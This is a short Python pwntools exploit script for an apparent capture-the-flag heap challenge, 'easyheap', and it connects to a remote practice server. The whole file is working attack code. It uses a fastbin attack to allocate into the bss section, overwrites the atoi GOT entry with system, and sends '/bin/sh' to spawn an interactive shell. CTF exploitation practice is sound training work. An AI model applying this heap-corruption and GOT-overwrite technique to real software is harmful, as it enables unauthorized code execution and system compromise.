from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
# p = process([ld_path, "./easyheap"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 27547)
pro = ELF("./easyheap")

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def create(size, con):
    sa("Your choice :", "1")
    sa("Size of Heap : ", str(size))
    sa("Content of heap:", con)

def edit(index, size, con):
    sa("Your choice :", "2")
    sa("Index :", str(index))
    sa("Size of Heap : ", str(size))
    sa("Content of heap : ", con)

def free(index):
    sa("Your choice :", "3")
    sa("Index :", str(index))

def back():
    sa("Your choice :", "4869")

# use this method to get shell

stdin = 0x06020B0
magic = 0x06020C0
atoi = pro.got["atoi"]
system = pro.plt["system"]


# fastbin attack 
# alloc to bss
create(0x10, "0")
create(0x60, "1")
free(1)
pad = cyclic(0x10)+p64(0)+p64(0x71)+p64(stdin-0x3)
edit(0, len(pad), pad)
create(0x60, "1")
pad = cyclic(0x23)+p64(atoi)
create(0x60, pad)

# alter atoi to system
edit(0, 8, p64(system))

# attack
sa("Your choice :", "/bin/sh\x00")

shell()


